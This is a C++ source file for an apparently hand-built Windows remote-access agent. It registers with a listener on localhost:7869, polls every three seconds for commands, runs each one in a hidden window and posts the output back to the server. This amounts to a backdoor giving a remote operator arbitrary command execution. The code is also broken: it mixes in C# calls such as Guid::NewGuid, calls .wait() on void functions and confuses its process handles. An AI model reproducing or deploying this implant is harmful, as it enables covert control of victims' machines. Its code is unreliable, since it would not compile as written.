#include <iostream>
#include <string>
#include <cstdlib>
#include <cstdio>
#include <chrono>
#include <thread>
#include <windows.h>
#include <cpprest/http_client.h>
#include <cpprest/json.h>

using namespace std;
using namespace web;
using namespace web::http;
using namespace web::http::client;

// Default listener I created on web server
string baseAddress = "http://localhost:7869";
string agentGuid = to_string(Guid::NewGuid());
string publicKey = "PUBLICKEY";

class Job
{
public:
    string id;
    string command;
};

http_client client(baseAddress);

void Handshake()
{
    string request = baseAddress + "/?df2f1f3f7h6h4=n&agentGuid=" + agentGuid;
    client.request(methods::GET, request).wait();
}

task<Job> GetJob()
{
    string request = baseAddress + "/?" + to_string(Guid::NewGuid()) + "=n&agentGuid=" + agentGuid;
    return client.request(methods::GET, request).then([](http_response response)
    {
        if (response.status_code() == status_codes::OK)
        {
            return response.extract_json();
        }

        return json::value();
    }).then([](json::value jsonValue)
    {
        return jsonValue.has_field("id") && jsonValue.has_field("command") ? 
            Job { jsonValue.at("id").as_string(), jsonValue.at("command").as_string() } : 
            Job { "", "" };
    });
}

void CompleteJob(string jobGuid, string jobResponse)
{
    string request = baseAddress + "/?df2f1f3f7h9h4=n&jobGuid=" + jobGuid + "&agentGuid=" + agentGuid + "&response=" + jobResponse;
    client.request(methods::GET, request).wait();
}

string ExecuteCommand(string command)
{
    string response = string("");

    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    SECURITY_ATTRIBUTES sa;
    ZeroMemory(&sa, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    HANDLE hOutputRead = NULL;
    HANDLE hOutputWrite = NULL;
    if (!CreatePipe(&hOutputRead, &hOutputWrite, &sa, 0))
    {
        return response;
    }
    SetHandleInformation(hOutputRead, HANDLE_FLAG_INHERIT, 0);
    si.hStdOutput = hOutputWrite;
    si.hStdError = hOutputWrite;
    PROCESS_INFORMATION processInfo;
    ZeroMemory(&processInfo, sizeof(processInfo));
    if (!CreateProcess(NULL, const_cast<LPSTR>(command.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        return response;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(hOutputWrite);
    CHAR buffer[1024];
    DWORD bytesRead;
    while (ReadFile(hOutputRead, buffer, sizeof(buffer), &bytesRead, NULL))
    {
        response.append(buffer, bytesRead);
    }
    CloseHandle(hOutputRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return response;
}

int main()
{
    std::cout << publicKey << std::endl;

    // Handshake
    Handshake().wait();

    while (true)
    {
        try
        {
            auto job = GetJob().get();

            if (!job.id.empty())
            {
                std::string response = ExecuteCommand(job.command);

                CompleteJob(job.id, response).wait();
            }

            std::this_thread::sleep_for(std::chrono::seconds(3));
        }
        catch (const std::exception& ex)
        {
            std::cerr << ex.what() << std::endl;
        }
    }

    return 0;
}





